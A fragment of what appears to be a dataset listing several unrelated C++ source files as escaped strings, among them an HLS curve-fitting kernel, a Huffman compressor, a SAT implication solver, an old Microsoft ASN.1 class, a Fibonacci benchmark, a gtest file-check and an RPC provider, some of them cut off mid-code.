problem.MakeHessian();\n//\t\t  \t  problem.Solve();\n//\t\t  \t  C[0]=verticies_[0].parameters[0][0];\n//\t\t  \t  C[1]=verticies_[0].parameters[1][0];\n//\t\t  \t  C[2]=verticies_[0].parameters[2][0];\n////\t\t  \t  MATRIXDEBUG(abc.parameters);\n//}\n\nvoid MatrixMultiple(unsigned int A_[100], unsigned int B_[100],\n                     unsigned int C_[100], unsigned int A_a_[100],\n                     unsigned int B_b_[100]) {\n#pragma HLS INTERFACE s_axilite port = return\n#pragma HLS INTERFACE s_axilite port = A_\n#pragma HLS INTERFACE s_axilite port = B_\n#pragma HLS INTERFACE s_axilite port = C_\n#pragma HLS INTERFACE s_axilite port = A_a_\n#pragma HLS INTERFACE s_axilite port = B_b_\n\n  float A[100] = {};\n  float B[100] = {};\n  float C[100] = {};\n  float A_a[100] = {};\n  float B_b[100] = {};\n  memcpy(A, A_, 100 * sizeof(float));\n  memcpy(B, B_, 100 * sizeof(float));\n\n  // \u6784\u5efa\u95ee\u9898\n  Problem problem;\n\n  // \u6784\u5efa100\u6761\u8fb9\n  for (int i = 0; i < 100; i++) {\n    //\t\t\tverticies_[0]=&abc;\n    // problem.edge_curves[i].verticies_[0].parameters[0][0] = 0;\n    // problem.edge_curves[i].verticies_[0].parameters[1][0] = 0;\n    // problem.edge_curves[i].verticies_[0].parameters[2][0] = 0;\n\tfloat info[1][1];\n    info[0][0] = 1;\n    problem.edge_curves[i].SetInformation(info);\n    //\t\t\tdouble x = i / 100.0;\n    //\t\t\tproblem.edge_curves[i].x_ = x;\n    //\t\t\tproblem.edge_curves[i].y_ = std::exp(a * x * x + b * x +\n    //c);\n    problem.edge_curves[i].x_ = A[i];\n    problem.edge_curves[i].y_ = B[i];\n    problem.edge_curves_size++;\n  }\n\n  // problem.CalculateResidual();\n  // std::terminate();\n  // std::cout << VAR(problem.Chi2()) << std::endl;\n  // problem.MakeHessian();\n  problem.Solve();\n  C[0] = verticies_[0].parameters(0,0);\n  C[1] = verticies_[0].parameters(1,0);\n  C[2] = verticies_[0].parameters(2,0);\n  //\t\t  \t  MATRIXDEBUG(abc.parameters);\n  for(int i=0;i<100;i++) {\n  \tA_a[i]=A[i];\n  }\n  for(int i=0;i<100;i++) {\n  \tB_b[i]=B[i]+2;\n  }\n  memcpy(C_, C, 100 * sizeof(float));\n  memcpy(A_a_, A_a, 100 * sizeof(float));\n  memcpy(B_b_, B_b, 100 * sizeof(float));\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <map>\n#include <vector>\n#include <bitset>\n#include <queue>\n\nusing namespace std;\n\n\n/************************/\n//n\u00f3 da arvore de huffman\nstruct Node {\n    int frequency;\n    unsigned char byte;\n    bool isLeaf;\n    Node* left = nullptr;\n    Node* right = nullptr;\n};\n\n//percorre a arvore de huffman e cria um map que mapeia codigo -> byte para facilitar a compressao\nmap<unsigned char, string> createHuffTable(Node* node, vector<string> path, map<unsigned char, string>& huffTable, string direction = \"\") {\n    if (direction != \"\") {\n        path.push_back(direction);\n    }\n\n    if(node->isLeaf) {\n        // cout << \"recursive print: \" << node->byte << \" \" << node->frequency << endl;\n        string acc = \"\";\n        for (auto v : path) {\n            acc += v;\n        }\n        huffTable.emplace(node->byte, acc);\n        return huffTable;\n    }\n        \n    createHuffTable(node->left, path, huffTable, \"0\");\n    createHuffTable(node->right, path, huffTable, \"1\");\n    return huffTable;\n}\n\n//pega a extensao do arquivo\nstring get_extension(string fileName) {\n    size_t dotIndex = fileName.find_last_of(\".\");\n    if (dotIndex != string::npos && dotIndex != fileName.length() - 1) {\n        return fileName.substr(dotIndex);\n    }\n    return \"\";  // No extension found\n}\n\n//pega o nome do arquivo\nstring get_fName(string fileName) {\n    size_t dotIndex = fileName.find_last_of(\".\");\n    if (dotIndex != string::npos && dotIndex != fileName.length() - 1) {\n        return fileName.substr(0, dotIndex);\n    }\n    return \"\";  // No extension found\n}\n\nstruct CompareNodes {\n    bool operator()(const Node* a, const Node* b) const {\n        return a->frequency > b->frequency;\n    }\n};\n\n//retorna a raiz da arvore de huffman\nNode* buildHuffmanTree(const std::vector<Node*>& frequencyTable) {\n\n    std::priority_queue<Node*, std::vector<Node*>, CompareNodes> orderedFrequency;\n    for (Node* node : frequencyTable) {\n        orderedFrequency.push(node);\n    }\n    \n    while (orderedFrequency.size() >= 2) {\n        Node* leastFrequent = orderedFrequency.top();\n        orderedFrequency.pop();\n\n        Node* secondLeast = orderedFrequency.top();\n        orderedFrequency.pop();\n\n        Node* n = new Node;\n        n->frequency = leastFrequent->frequency + secondLeast->frequency;\n        n->left = leastFrequent;\n        n->right = secondLeast;\n        n->isLeaf = false;\n\n        orderedFrequency.push(n);\n    }\n\n    // Return the root of the Huffman tree\n    return orderedFrequency.top();\n}\n\nint main() {\n    string INPUT_FILE = \"\";\n    cout << \"Nome do arquivo com extensao (exemplo.ext):\\n\";\n    cin >> INPUT_FILE;\n    cin.ignore();\n    std::ifstream fileIn(INPUT_FILE, std::ios::binary);\n    if (!fileIn) {\n        std::cerr << \"Error ao abrir: \" + INPUT_FILE << std::endl;\n        return 1;\n    }\n\n\n    map <unsigned char, int> countFrequency;\n    unsigned char byte;\n\n    cout << \"contando frequencias...\" << endl;\n    while (fileIn.read((char*)&byte, sizeof(unsigned char))) {\n        countFrequency[byte]++;\n    }\n\n    if (!fileIn.eof()) {\n        std::cerr << \"Erro durante a leitura do arquivo\" << std::endl;\n        return 1;\n    }\n\n    vector <Node*> frequencyTable;\n    for(auto pair:countFrequency) {\n        Node* n = new Node;\n        n->byte = pair.first;\n        n->frequency = pair.second;\n        n->isLeaf = true;\n        frequencyTable.push_back(n);\n    }\n\n    cout << \"criando a arvore de huffman...\" << endl;\n    Node* root = buildHuffmanTree(frequencyTable);\n\n    cout << \"criando uma tabela de codigos...\" << endl;\n    vector<string> path;\n    map<unsigned char, string> huffTable;\n    createHuffTable(root, path, huffTable);\n\n    unsigned char byte2;\n    string acc = \"\";\n    fileIn.clear();\n    fileIn.seekg(0);\n    cout << \"comprimindo...\" << endl;\n    while (fileIn.read((char*)&byte2, sizeof(unsigned char))) {\n        acc += huffTable[byte2];\n    }\n\n    if (!fileIn.eof()) {\n        std::cerr << \"Erro durante a leitura do arquivo\" << std::endl;\n        return 1;\n    }\n\n\n    unsigned long int counter = 0;\n    string fName = get_fName(INPUT_FILE);\n    std::ofstream fileOut(fName + \".huff\", std::ios::binary);\n    if (!fileOut) {\n        std::cerr << \"Nao foi possivel abrir \" + INPUT_FILE << std::endl;\n        return 1;\n    }\n\n    cout << \"escrevendo arquivo comprimido...\" << endl;\n    size_t accSize = acc.size();\n    for (size_t i = counter; i + 8 <= accSize; i += 8) {\n        std::string bits;\n        for (size_t j = i; j < i + 8; ++j) {\n            bits += acc[j];\n        }\n\n        bitset<8> toWrite{bits};\n        unsigned long uBits = toWrite.to_ulong(); //converte em inteiro\n        unsigned char cBits = static_cast<unsigned char>(uBits); //converte em char\n\n        fileOut.write((char*)&cBits, sizeof(unsigned char));\n    }\n\n    counter = accSize - (accSize % 8);\n\n    unsigned int diff = acc.size() - counter;\n    string bits = acc.substr(counter, diff);\n\n\n    unsigned int diffToEight = 8 - diff;\n ",
    "#include \"implysolver.h\"\n#include <algorithm>\nusing namespace std;\n\n#ifdef MINISAT\nusing namespace Minisat;\n#else\nusing namespace Glucose;\n#endif\n\nnamespace car\n{\n    std::map<int, int> counter;\n    std::map<int, std::map<int, double>> moms;\n    std::map<int, std::shared_ptr<ImplySolver>> ImplySolver::imp_solvers;\n\n    bool ImplySolver::is_blocked_MOM(State *s, int level)\n    {\n        // not so good to those with large latches scales.\n        std::shared_ptr<ImplySolver> solver = getSolver(level);\n        if(moms.find(level) == moms.end())\n        {\n            moms[level] = {};\n            return false;\n        }\n\n        auto& ref = moms[level];\n        std::vector<int> ass = s->s();\n        std::sort(ass.begin(),ass.end(),[&ref](int a, int b){return ref[b] < ref[a];});\n\n        solver->set_assumption(ass);\n\n        /* note, we set the budget of solver in this level.\n           we do not actually need the solution. We just want to check whether it is blocked by any UC.\n           if blocked, it's clear, that to propagate the state will already make the assignment of the UC's clause to be UNSAT.\n        */\n        solver->Solver::setPropBudget(s->num_latches_);\n        return solver->Solver::solve_()==l_False;\n    };\n\n    void ImplySolver::add_uc_MOM(const std::vector<int> &uc, int level)\n    {\n        std::shared_ptr<ImplySolver> solver = getSolver(level);\n        if(moms.find(level) == moms.end())\n        {\n            moms[level] = {};\n        }\n        // add negate of uc as a clause.\n        // no flag. forever added.\n        vec<Lit> lits(uc.size());\n        int index = 0;\n        for (int id : uc)\n        {\n            lits[index++] = solver->SAT_lit(-id);\n        }\n        solver->addClause(lits);\n        if(uc.size() <= 10)\n        {\n            ++counter[level];\n            double weight = 1.0 / (1<<uc.size()) + counter[level] * (1.0/(1<<20));\n            for(auto& lit: uc)\n            {\n                moms[level][-lit] += weight;\n            }            \n        }\n\n\n    }\n\n    bool ImplySolver::is_blocked(State *s, int level)\n    {\n        // not so good to those with large latches scales.\n        std::shared_ptr<ImplySolver> solver = getSolver(level);\n        solver->set_assumption(s->s());\n\n        /* note, we set the budget of solver in this level.\n           we do not actually need the solution. We just want to check whether it is blocked by any UC.\n           if blocked, it's clear, that to propagate the state will already make the assignment of the UC's clause to be UNSAT.\n        */\n        solver->Solver::setPropBudget(s->num_latches_);\n        return solver->Solver::solve_()==l_False;\n    };\n\n    void ImplySolver::add_uc(const std::vector<int> &uc, int level)\n    {\n        std::shared_ptr<ImplySolver> solver = getSolver(level);\n        // add negate of uc as a clause.\n        // no flag. forever added.\n        vec<Lit> lits(uc.size());\n        int index = 0;\n        for (int id : uc)\n            lits[index++] = solver->SAT_lit(-id);\n        solver->addClause(lits);\n    }\n} // namespace car",
    "/*++\r\n\r\nCopyright (c) 1995  Microsoft Corporation\r\n\r\nModule Name:\r\n\r\n    asnprimt\r\n\r\nAbstract:\r\n\r\n    This module provides the implementation of the ASN.1 Primitive Object base\r\n    class.\r\n\r\nAuthor:\r\n\r\n    Doug Barlow (dbarlow) 10/8/1995\r\n\r\nEnvironment:\r\n\r\n    Win32\r\n\r\nNotes:\r\n\r\n\r\n\r\n--*/\r\n\r\n#include <windows.h>\r\n#include \"asnPriv.h\"\r\n\r\n\r\n//\r\n//==============================================================================\r\n//\r\n//  CAsnPrimitive\r\n//\r\n\r\nIMPLEMENT_NEW(CAsnPrimitive)\r\n\r\n/*++\r\n\r\nCAsnPrimitive:\r\n\r\n    This is the constructor for a Primitve type ASN.1 encoding.\r\n\r\nArguments:\r\n\r\n    dwType is the type of the object.\r\n\r\n    dwFlags supplies any special flags for this object.  Options are:\r\n\r\n        fOptional implies the object is optional.\r\n\r\n    dwTag is the tag of the object.  If this is zero, the tag is taken from the\r\n        type.\r\n\r\nReturn Value:\r\n\r\n    None\r\n\r\nAuthor:\r\n\r\n    Doug Barlow (dbarlow) 10/6/1995\r\n\r\n--*/\r\n\r\nCAsnPrimitive::CAsnPrimitive(\r\n        IN DWORD dwFlags,\r\n        IN DWORD dwTag,\r\n        IN DWORD dwType)\r\n:   CAsnObject(dwFlags, dwTag, dwType),\r\n    m_bfData()\r\n{\r\n    ASSERT(0 == (dwFlags & (fConstructed)));\r\n    m_rgEntries.Add(this);\r\n}\r\n\r\n\r\n/*++\r\n\r\nClear:\r\n\r\n    This method sets the primitive object to it's default state.  It does not\r\n    affect the default setting.\r\n\r\nArguments:\r\n\r\n    None\r\n\r\nReturn Value:\r\n\r\n    none\r\n\r\nAuthor:\r\n\r\n    Doug Barlow (dbarlow) 10/6/1995\r\n\r\n--*/\r\n\r\nvoid\r\nCAsnPrimitive::Clear(\r\n    void)\r\n{\r\n    m_bfData.Reset();\r\n    m_dwFlags &= ~fPresent;\r\n    if (NULL != m_pasnParent)\r\n        m_pasnParent->ChildAction(act_Cleared, this);\r\n}\r\n\r\n\r\n/*++\r\n\r\nDataLength:\r\n\r\n    This method returns the length of the local machine encoding of the data.\r\n    For this general object, the local machine encoding and ASN.1 encoding are\r\n    identical.\r\n\r\nArguments:\r\n\r\n    None\r\n\r\nReturn Value:\r\n\r\n    >= 0 - The length of the local machine encoding.\r\n\r\nAuthor:\r\n\r\n    Doug Barlow (dbarlow) 10/6/1995\r\n\r\n--*/\r\n\r\nLONG\r\nCAsnPrimitive::DataLength(\r\n    void)\r\nconst\r\n{\r\n    LONG lth;\r\n\r\n    switch (State())\r\n    {\r\n    case fill_Empty:\r\n    case fill_Optional:\r\n        lth = -1;       // ?error? Incomplete Structure\r\n        break;\r\n\r\n    case fill_Defaulted:\r\n        lth = m_bfDefault.Length();\r\n        break;\r\n\r\n    case fill_Present:\r\n        lth = m_bfData.Length();\r\n        break;\r\n\r\n    case fill_Partial:\r\n    case fill_NoElements:\r\n    default:\r\n        ASSERT(FALSE);   // ?error? Internal error\r\n        lth = -1;\r\n        break;\r\n    }\r\n    return lth;\r\n}\r\n\r\n\r\n/*++\r\n\r\nRead:\r\n\r\n    This default method provides the stored data.\r\n\r\nArguments:\r\n\r\n    pbDst receives the value.  It is assumed to be long enough.\r\n\r\nReturn Value:\r\n\r\n    If >=0, the length of the data portion of this object.\r\n    if < 0, an error occurred.\r\n\r\nAuthor:\r\n\r\n    Doug Barlow (dbarlow) 10/5/1995\r\n\r\n--*/\r\n\r\nLONG\r\nCAsnPrimitive::Read(\r\n    OUT LPBYTE pbDst)\r\nconst\r\n{\r\n    LONG lth;\r\n\r\n    switch (State())\r\n    {\r\n    case fill_Empty:\r\n    case fill_Optional:\r\n        lth = -1;       // ?error? Incomplete structure.\r\n        break;\r\n\r\n    case fill_Defaulted:\r\n        lth = m_bfDefault.Length();\r\n        memcpy(pbDst, m_bfDefault.Access(), lth);\r\n        break;\r\n\r\n    case fill_Present:\r\n        lth = m_bfData.Length();\r\n        memcpy(pbDst, m_bfData.Access(), lth);\r\n        break;\r\n\r\n    case fill_Partial:\r\n    case fill_NoElements:\r\n    default:\r\n        ASSERT(FALSE);   // ?error? Internal error\r\n        lth = -1;\r\n        break;\r\n    }\r\n    return lth;\r\n}\r\n\r\n\r\n/*++\r\n\r\nWrite:\r\n\r\n    This default implementation copies the provided data to our data buffer.\r\n\r\nArguments:\r\n\r\n    pbSrc supplies the data as a BYTE array, with\r\n    cbSrcLen supplies the length of the pbSrc Array.\r\n\r\nReturn Value:\r\n\r\n    If >=0, the length of the data portion of this object.\r\n    if < 0, an error occurred.\r\n\r\nAuthor:\r\n\r\n    Doug Barlow (dbarlow) 10/5/1995\r\n\r\n--*/\r\n\r\nLONG\r\nCAsnPrimitive::Write(\r\n    IN const BYTE FAR *pbSrc,\r\n    IN DWORD cbSrcLen)\r\n{\r\n    if (0 < cbSrcLen)\r\n    {\r\n        if (NULL == m_bfData.Set(pbSrc, cbSrcLen))\r\n            return -1;\r\n    }\r\n    else\r\n        m_bfData.Reset();\r\n    m_dwFlags |= fPresent;\r\n    if (NULL != m_pasnParent)\r\n        m_pasnParent->ChildAction(act_Written, this);\r\n    return m_bfData.Length();\r\n}\r\n\r\n\r\n/*++\r\n\r\nEncodingLength:\r\n\r\n    This method returns the length of the object in its ASN.1 encoding.\r\n\r\nArguments:\r\n\r\n    None\r\n\r\nReturn Value:\r\n\r\n    >= 0 is the length of the object's ASN.1 encoding.\r\n    < 0 implies an error.\r\n\r\nAuthor:\r\n\r\n    Doug Barlow (dbarlow) 10/5/1995\r\n\r\n--*/\r\n\r\nLONG\r\nCAsnPrimitive::_encLength(\r\n    void) const\r\n{\r\n    BYTE rge[32];\r\n    LONG lTotal = 0;\r\n    LONG lth;\r\n\r\n\r\n    switch (m_State)\r\n    {\r\n    case fill_Empty:\r\n        lth = -1;       // ?error? Incomplete structure\r\n        goto ErrorExit;\r\n        break;\r\n\r\n    case fill_Optional:\r\n    case fill_Defaulted:\r\n        lTotal = 0;\r\n        break;\r\n\r\n    case fill_Present:\r\n        lth = Enc",
    "#include <iostream>\n#include <unordered_map>\n#include <chrono>\n#include <functional>\n#include <array>\n\n// Recursive function to calculate Fibonacci\nint fibonacci(int n) {\n    if (n <= 1) {\n        return n;\n    }\n    else {\n        return fibonacci(n - 1) + fibonacci(n - 2);\n    }\n}\n\n// Recursive function with memoization to calculate Fibonacci\nint fibonacci_memo(int n, std::unordered_map<int, int>& memo) {\n    if (memo.find(n) != memo.end()) {\n        return memo[n];\n    }\n    if (n <= 1) {\n        return n;\n    }\n    memo[n] = fibonacci_memo(n - 1, memo) + fibonacci_memo(n - 2, memo);\n    return memo[n];\n}\n\n// Iterative function with tabulation to calculate Fibonacci using arrays\nint fibonacci_tabulation(int n) {\n    if (n <= 1) {\n        return n;\n    }\n    std::array<int, 41> dp = {};  // array to support up to Fibonacci(40)\n    dp[1] = 1;\n    for (int i = 2; i <= n; ++i) {\n        dp[i] = dp[i - 1] + dp[i - 2];\n    }\n    return dp[n];\n}\n\n// Function to measure execution time\ntemplate <typename Func, typename... Args>\nlong long measure_time(Func func, Args&&... args) {\n    auto start = std::chrono::high_resolution_clock::now();\n    func(std::forward<Args>(args)...);\n    auto end = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<long long, std::nano> duration = end - start;\n    return duration.count();\n}\n\n// Function to calculate average execution time\ntemplate <typename Func, typename... Args>\nlong long average_time(Func func, int iterations, Args&&... args) {\n    long long total_time = 0;\n    for (int i = 0; i < iterations; ++i) {\n        total_time += measure_time(func, std::forward<Args>(args)...);\n    }\n    return total_time / iterations;\n}\n\nint main() {\n    const int iterations = 1000;\n    std::vector<int> test_cases = { 10, 20, 30 };\n\n    for (int n : test_cases) {\n        std::cout << \"Calculating Fibonacci(\" << n << \")\\n\";\n\n        // Calculation and average time using the simple recursive function\n        long long avg_time_recursive = average_time(fibonacci, iterations, n);\n        std::cout << \"Average time for recursive Fibonacci: \" << avg_time_recursive << \" ns\\n\";\n\n        // Calculation and average time using the memoization function\n        std::unordered_map<int, int> memo;\n        auto fibonacci_memo_wrapper = [&memo](int n) { return fibonacci_memo(n, memo); };\n        long long avg_time_memo = average_time(fibonacci_memo_wrapper, iterations, n);\n        std::cout << \"Average time for memoized Fibonacci: \" << avg_time_memo << \" ns\\n\";\n\n        // Calculation and average time using the tabulation function\n        long long avg_time_tabulation = average_time(fibonacci_tabulation, iterations, n);\n        std::cout << \"Average time for tabulated Fibonacci: \" << avg_time_tabulation << \" ns\\n\";\n\n        std::cout << \"-----------------------------------\\n\";\n    }\n\n    return 0;\n}\n",
    "#include <gtest/gtest.h>\n#include <QCoreApplication>\n#include <QDir>\n#include <QFileInfo>\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <thread>\n#include <tuple>\n#include <sstream>\n\nvoid processFile(const QString& filePath,\n                 std::vector<std::tuple<int, uint32_t, uint32_t>>& errors,\n                 std::atomic<int>& errorCount) {\n    std::ifstream file(filePath.toStdString(), std::ios::binary);\n    if (!file) {\n        std::cerr << \"Error opening file: \" << filePath.toStdString() << std::endl;\n        return;\n    }\n\n    std::vector<uint32_t> lastValues(32, 0);\n    std::vector<bool> isFirstRead(32, true);\n\n    uint32_t value = 0;\n    char buffer[sizeof(uint32_t)];\n    int channel = 0;\n    while (file.read(buffer, sizeof(buffer))) {\n        std::copy(buffer, buffer + sizeof(buffer), reinterpret_cast<char*>(&value));\n        if (isFirstRead[channel]) {\n            lastValues[channel] = value;\n            isFirstRead[channel] = false;\n        } else {\n            uint32_t expected = 0;\n            if (lastValues[channel] == 0xFFFFFFFF) {\n                expected = 0;\n            } else {\n                expected = lastValues[channel] + 1;\n            }\n            if (value != expected) {\n                errors.emplace_back(channel, expected, value);\n                errorCount++;\n            }\n            lastValues[channel] = value;\n        }\n        channel = (channel + 1) % 32;\n    }\n\n    file.close();\n}\n\nvoid processDirectory(const QString& dirPath, const QString& outputFilePath) {\n    QDir dir(dirPath);\n    QStringList filePaths = dir.entryList(QDir::Files);\n\n    if (filePaths.size() != 8) {\n        std::cerr << \"Error: Directory should contain exactly 8 files.\" << std::endl;\n        return;\n    }\n\n    std::vector<std::vector<std::tuple<int, uint32_t, uint32_t>>> allErrors(8);\n    std::vector<std::atomic<int>> errorCounts(8);\n    std::vector<std::thread> threads;\n\n    for (int i = 0; i < 8; ++i) {\n        QString fullPath = dir.filePath(filePaths[i]);\n        threads.emplace_back(processFile, fullPath, std::ref(allErrors[i]), std::ref(errorCounts[i]));\n    }\n\n    for (auto& thread : threads) {\n        thread.join();\n    }\n\n    std::ofstream outputFile(outputFilePath.toStdString());\n    for (int i = 0; i < 8; ++i) {\n        QString fileName = QFileInfo(filePaths[i]).fileName();\n        for (const auto& error : allErrors[i]) {\n            int channel = std::get<0>(error);\n            uint32_t expected = std::get<1>(error);\n            uint32_t actual = std::get<2>(error);\n            outputFile << \"File: \" << fileName.toStdString() << \", Channel: \" << channel\n                       << \", Expected: \" << expected << \", Actual: \" << actual << std::endl;\n        }\n        outputFile << \"File: \" << fileName.toStdString() << \", Total errors: \" << errorCounts[i] << std::endl;\n    }\n    outputFile.close();\n}\n\nconst QString NO_ERRORS_DIR = \"data_raw_32_rand_ch_offs\";\nconst QString WITH_ERRORS_DIR = \"data_raw_32_rand_ch_offs_break\";\n\n\nTEST(ProcessDirectoryTest, NoErrors) {\n    processDirectory(NO_ERRORS_DIR, \"output_no_errors.txt\");\n\n    std::ifstream outputFile(\"output_no_errors.txt\");\n    std::vector<std::string> lines;\n    std::string line;\n    while (std::getline(outputFile, line)) {\n        lines.push_back(line);\n    }\n    outputFile.close();\n\n    ASSERT_EQ(lines.size(), 8);\n\n    std::vector<std::string> expectedLines = {\n        \"File: afe0_core0.pcm, Total errors: 0\",\n        \"File: afe0_core1.pcm, Total errors: 0\",\n        \"File: afe0_core2.pcm, Total errors: 0\",\n        \"File: afe0_core3.pcm, Total errors: 0\",\n        \"File: afe0_core4.pcm, Total errors: 0\",\n        \"File: afe0_core5.pcm, Total errors: 0\",\n        \"File: afe0_core6.pcm, Total errors: 0\",\n        \"File: afe0_core7.pcm, Total errors: 0\"\n    };\n\n        for (int i = 0; i < expectedLines.size(); ++i) {\n            EXPECT_EQ(lines[i], expectedLines[i]);\n        }\n\n        QFile::remove(\"output_no_errors.txt\");\n    }\n\nTEST(ProcessDirectoryTest, WithErrors) {\n    processDirectory(WITH_ERRORS_DIR, \"output_with_errors.txt\");\n\n    std::ifstream outputFile(\"output_with_errors.txt\");\n    std::vector<std::string> lines;\n    std::string line;\n    while (std::getline(outputFile, line)) {\n        lines.push_back(line);\n    }\n    outputFile.close();\n    EXPECT_GT(lines.size(), 8);\n    QFile::remove(\"output_with_errors.txt\");\n}\n\nint main(int argc, char **argv) {\n    ::testing::InitGoogleTest(&argc, argv);\n    return RUN_ALL_TESTS();\n}\n",
    "#include \"mprpcprovider.h\"\n#include \"mprpcapplication.h\"\n#include \"rpcheader.pb.h\"\n#include \"logger.h\"\n#include \"zookeeperutil.h\"\n\n// \u8fd9\u91cc\u662f\u6846\u67b6\u63d0\u4f9b\u7ed9\u5916\u90e8\u4f7f\u7528\u7684\uff0c\u53ef\u4ee5\u53d1\u5e03rpc\u65b9\u6cd5\u7684\u51fd\u6570\u63a5\u53e3\n// \u4e3a\u4fdd\u8bc1\u6846\u67b6\u7684\u901a\u7528\u6027\uff0c\u7528\u57fa\u7c7b\u63a5\u6536\u6d3e\u751f\u7c7b\u7684\u5bf9\u8c61\nvoid RpcProvider::NotifyService(google::protobuf::Service * service)\n{\n    // \u83b7\u53d6\u4e86\u670d\u52a1\u5bf9\u8c61\u7684\u63cf\u8ff0\u4fe1\u606f\n    const google::protobuf::ServiceDescriptor* pserviceDesc=service->GetDescriptor();\n    // \u83b7\u53d6\u670d\u52a1\u7684\u540d\u5b57\n    std::string service_name=pserviceDesc->name();\n    // \u83b7\u53d6\u670d\u52a1\u5bf9\u8c61service\u7684\u65b9\u6cd5\u7684\u6570\u91cf\n    int methodCnt=pserviceDesc->method_count();\n    std::cout<<\"service_name:\"<<service_name<<std::endl;\n\n    LOG_INFO(\"service_name:%s\",service_name.c_str());\n\n    ServiceInfo server_info;\n    for(int i=0;i<methodCnt;i++){\n        // \u83b7\u53d6\u4e86\u670d\u52a1\u5bf9\u8c61\u6307\u5b9a\u4e0b\u6807\u7684\u670d\u52a1\u65b9\u6cd5\u7684\u63cf\u8ff0 (\u62bd\u8c61\u63cf\u8ff0)\n        const google::protobuf::MethodDescriptor* pmethodDesc=pserviceDesc->method(i);\n        std::string method_name=pmethodDesc->name();\n        server_info.m_methodMap.insert({method_name,pmethodDesc});\n        std::cout<<\"method_name:\"<<method_name<<std::endl;\n\n        LOG_INFO(\"method_name:%s\",method_name.c_str());\n\n    }\n    server_info.m_service=service;\n    m_serviceMap.insert({service_name,server_info});\n}\n\n// \u542f\u52a8rpc\u670d\u52a1\u8282\u70b9\uff0c\u5f00\u59cb\u63d0\u4f9brpc\u8fdc\u7a0b\u7f51\u7edc\u8c03\u7528\u670d\u52a1(muduo\u7f51\u7edc\u5e93)\nvoid RpcProvider::Run()\n{\n    std::string ip=MprpcApplication::GetInstance().GetConfig().Load(\"rpcserverip\");\n    uint16_t port=atoi(MprpcApplication::GetInstance().GetConfig().Load(\"rpcserverport\").c_str());\n\n    muduo::net::InetAddress address(ip,port);\n\n    // \u521b\u5efaTcpServer\u5bf9\u8c61\n    muduo::net::TcpServer server(&m_eventLoop,address,\"RpcProvider\");\n    // \u7ed1\u5b9a\u8fde\u63a5\u56de\u8c03\u548c\u6d88\u606f\u8bfb\u5199\u56de\u8c03\uff0c\u5206\u79bb\u4e86\u7f51\u7edc\u4ee3\u7801\u548c\u4e1a\u52a1\u4ee3\u7801\n    server.setConnectionCallback(std::bind(&RpcProvider::OnConnection,this,std::placeholders::_1));\n    server.setMessageCallback(std::bind(&RpcProvider::OnMessage,this,std::placeholders::_1,std::placeholders::_2,std::placeholders::_3));\n    \n    // \u8bbe\u7f6emuduo\u5e93\u7684\u7ebf\u7a0b\u6570\u91cf\n    server.setThreadNum(4);\n\n    // \u628a\u5f53\u524drpc\u8282\u70b9\u4e0a\u53d1\u5e03\u7684\u670d\u52a1\u5168\u90e8\u6ce8\u518c\u5230zookeeper\u4e0a\uff0c\u8ba9rpc client\u53ef\u4ee5\u4ecezookeeper\u4e0a\u53d1\u73b0\u670d\u52a1\n    // session\u4f1a\u8bdd\u7684timeout 30s\uff0czkclient \u7f51\u7edcI/O\u7ebf\u7a0b\u4f1a\u5728 1/3*timeout \u65f6\u95f4\u53d1\u9001ping\u5fc3\u8df3\u6d88\u606f\n    ZkClient zkCli;\n    zkCli.Start();\n    // \u4ee4service_name\u4e3a\u6c38\u4e45\u6027\u8282\u70b9   method_name\u4e3a\u4e34\u65f6\u6027\u8282\u70b9\n    for(const auto &sp:m_serviceMap){\n        std::string  service_path=\"/\"+sp.first;\n        zkCli.Create(service_path.c_str(),nullptr,0);// \u7b2c\u56db\u4e2a\u53c2\u6570\u9ed8\u8ba4\u4e3a\u96f6\uff0c\u8868\u793a\u6c38\u4e45\u6027\u8282\u70b9\n        for(const auto&mp:sp.second.m_methodMap){\n            std::string method_path=service_path+\"/\"+mp.first;\n            char method_data[64]={0};\n            sprintf(method_data,\"%s:%d\",ip.c_str(),port);\n            // ZOO_EPHEMERAL\u8868\u793aznode\u662f\u4e00\u4e2a\u4e34\u65f6\u6027\u8282\u70b9\n            zkCli.Create(method_path.c_str(),method_data,strlen(method_data),ZOO_EPHEMERAL);\n        }\n    }\n\n    std::cout<<\"RpcProvider start service at ip:\"<<ip<<\" port:\"<<port<<std::endl;\n    LOG_INFO(\"ip:%s\",ip.c_str());\n\n    // \u542f\u52a8\u7f51\u7edc\u670d\u52a1\n    server.start();\n    m_eventLoop.loop();\n}\n\n// \u65b0\u7684\u8fde\u63a5\u56de\u8c03\nvoid RpcProvider::OnConnection(const muduo::net::TcpConnectionPtr &conn)\n{\n    if(!conn->connected()){\n        conn->shutdown();// \u65ad\u5f00\u8fde\u63a5\n    }\n}\n/*\n\u5728\u6846\u67b6\u5185\u90e8\uff0cRpcProvider\u548cRpcConsumer\u4e4b\u95f4\u534f\u5546\u597d\u901a\u4fe1\u7528\u7684protobuf\u6570\u636e\u7c7b\u578b\nservice_name method_name args    \u5b9a\u4e49proto\u7684message\u7c7b\u578b\uff0c\u8fdb\u884c\u6570\u636e\u5934\u7684\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\nheader_size(4\u4e2a\u5b57\u8282)+ header_str+ args_str\n*/\n// \u5df2\u5efa\u7acb\u8fde\u63a5\u7528\u6237\u7684\u8bfb\u5199\u4e8b\u4ef6\u56de\u8c03\uff0c\u5982\u679c\u8fdc\u7a0b\u6709\u4e00\u4e2arpc\u670d\u52a1\u7684\u8c03\u7528\u8bf7\u6c42\uff0c\u90a3\u4e48OnMessage\u65b9\u6cd5\u5c31\u4f1a\u54cd\u5e94\nvoid RpcProvider::OnMessage(const muduo::net::TcpConnectionPtr &conn, \n                        muduo::net::Buffer *buffer, muduo::Timestamp time)\n{\n    // \u7f51\u7edc\u4e0a\u63a5\u6536\u7684\u8fdc\u7a0brpc\u8c03\u7528\u8bf7\u6c42\u7684\u5b57\u7b26\u6d41\n    std::string recv_buf=buffer->retrieveAllAsString();\n\n    // \u4ece\u5b57\u7b26\u6d41\u4e2d\u8bfb\u53d6\u524d4\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\n    uint32_t header_size=0;\n    recv_buf.copy((char*)&header_size,4,0);// \u8bfb\u53d6\u524d4\u4e2a\u5b57\u8282\u8d4b\u503c\u7ed9header_size\n\n    // \u6839\u636eheader_size\u8bfb\u53d6\u6570\u636e\u5934\u7684\u539f\u59cb\u5b57\u7b26\u6d41\n    std::string rpc_header_str=recv_buf.substr(4,header_size);\n    